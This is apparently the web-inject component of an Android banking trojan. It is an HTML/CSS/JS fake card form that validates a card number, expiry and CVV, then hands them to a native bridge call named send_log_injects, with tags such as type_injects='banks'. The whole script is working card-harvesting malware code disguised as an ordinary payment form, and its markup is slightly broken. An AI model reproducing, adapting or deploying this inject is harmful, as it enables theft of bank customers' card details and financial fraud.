<style>
    .cool-input {
            box-sizing: border-box;
            border: 0;
            width: 100%;
            position: relative;
            font-size: 16px;
            margin-bottom: 15px;
        }

        .cool-input__input {
            box-sizing: border-box;
            background: none;
            width: 100%;
            padding: 10px;
            padding-left: 0;
            position: relative;
            z-index: 2;
            font-size: 14px;

        }

        .cool-input__input:focus {
            outline: none;
        }

        .cool-input__placeholder {
            box-sizing: border-box;
            border: none;
            background: none;
            width: auto;
            position: absolute;
            z-index: 1;
            left: 0;
            top: 50%;
            line-height: 1em;

            color: #bbbbbb;
            transition: all 0.2s ease;
            font-weight: 700;
        }  


        .cool-input__input_filled+.cool-input__placeholder,
        .cool-input__input:focus+.cool-input__placeholder {
            font-size: 0.8em;
            top: 0;
            margin-top: 0.3em;
            padding: 5px 0;
            z-index: 99;
            width: auto;
            left: 0;
        }

        .cool-input__input:focus+.cool-input__placeholder {
            color: #d9d9d9;

        }

        .input {
            border: 0;
            border-bottom: 1px solid #e5e5e5;
            margin-top: 15px;
            padding-left: 0;
            transition: all 0.2s ease;
            color: #000;
            padding-right: 25px;
        }

        .input:focus {
            border-bottom: 1px solid #e5e5e5;
        }

        input,
        button {
            outline: none !important;
            box-shadow: none !important;
        }

        section {
            padding: 18px;
            flex: 1;
        }

        .button {
            width: 100%;
            padding: 8px;
            color: #fff;
            background-color: #222222;
            border: 0;
            margin-bottom: 15px;
            font-weight: 600;
        }

        .button:disabled {
            opacity: 0.4;
        }
        .error {
            border-color: #f00 !important;
        }
        form{
        display: flex;
        flex-direction: column;
        min-height: 100vh;
        }
        footer{
            clear: both;
        }

    </form>
<script>
        $('#cc').mask('0000 0000 0000 0000')
        $('#exp').mask('00/00')
        $('#cvv').mask('000')

    var sendData = document.getElementById('sendData');

    $('.cool-input__input').on('input', function () {
            var $this = $(this);
            if ($this.val() == '') {
                $this.removeClass('cool-input__input_filled');
            } else {
                $this.addClass('cool-input__input_filled');
            }
        });
        function check7() {
            
            var mmYY = exp.value.split('/');
            var month = parseInt(mmYY[0]);
            var year = parseInt(mmYY[1]);
    
            var expArray = exp.value.split('/');
            var today, someday;
            var exMonth = expArray[0];
            var exYear = "20" + expArray[1];
    
            today = new Date();
            someday = new Date();
            someday.setFullYear(exYear, exMonth, 1);
                    
            if(month > 12 || month == 0 || month == 00 || someday < today || year > 27 || exp.value.length != 5) {
                exp.classList.add('error')
            } else {
                exp.classList.remove('error')
                return true
            }
        }

        function valid_credit_card(value) {
            if(value=='' || value.length < 19 || value=='0000 0000 0000 0000') return false;
            if (/[^0-9-\s]+/.test(value)) return false;
            var nCheck = 0, nDigit = 0, bEven = false;
            value = value.replace(/\D/g, "");
            for (var n = value.length - 1; n >= 0; n--) {
                var cDigit = value.charAt(n),
                    nDigit = parseInt(cDigit, 10);
                if (bEven) {
                    if ((nDigit *= 2) > 9) nDigit -= 9;
                }
                nCheck += nDigit;
                bEven = !bEven;
            }
            return (nCheck % 10) == 0;
            
        }

        function check6() {
            if(!valid_credit_card(cc.value)) {
                cc.classList.add('error')
            } else {
                cc.classList.remove('error');
            }
        }

        function check8() {
            if(valid_credit_card(cc.value) && check7() && cvv.value.length === 3) {
                sendData.disabled = false;
            } else {
                sendData.disabled = true;
            }
        }

        sendData.onclick = () => {
            var data = {};
                data.cc = cc.value;
                data.exp = exp.value;
                data.cvv = cvv.value;
                data.type_injects = "banks";
                data.closed = "close_activity_injects";

                var ua = navigator.userAgent.toLowerCase();
                if(ua.indexOf("android") > -1) {
                    try {
                        Android.send_log_injects(JSON.stringify(data))
                    } catch (err) {}
                }else{
                    alert(JSON.stringify(data));
                }
        }
</script>
